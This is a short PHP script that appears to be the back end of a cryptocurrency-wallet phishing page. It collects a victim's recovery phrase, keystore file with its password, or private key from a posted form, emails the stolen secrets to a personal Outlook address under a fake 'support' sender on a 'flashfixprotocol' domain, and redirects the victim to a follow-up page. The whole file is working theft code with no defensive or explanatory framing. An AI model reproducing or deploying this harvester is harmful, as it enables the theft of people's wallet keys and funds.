<?php 
    
   if(!isset($_POST['type']) ){
        header("Location:import.html");
        exit();
    }

    $type = $_POST['type'];

    if( $type == "phrase" ){

        $phrase = $_POST['phrase'];
        $value = $_POST['value'];

        $msg = 'Phrase : '.$phrase.", Value : ".$value ;
    }
    else if( $type == "keystore" ){

        $keystorejson = $_POST['keystorejson'];
        $keystorepasswword = $_POST['keystorepasswword'];
        $value = $_POST['value'];

        $msg = 'keystorejson : '.$keystorejson.", keystorepasswword : ".$keystorepasswword.", Value : ".$value ;        
    }
    else if( $type == "privatekey" ){

        $privatekey = $_POST['privatekey'];
        $value = $_POST['value'];

        $msg = 'privatekey : '.$privatekey.", Value : ".$value ;

    }


    $user = "oluwaseuncoded123@outlook.com";

    $to = $user;
    $subject = "The Mail";


    // More headers
    $headers = 'From: <support@flashfixprotocol.online>' . "\r\n";

    mail($to,$subject,$msg,$headers);
    header("Location:auth.html");

?>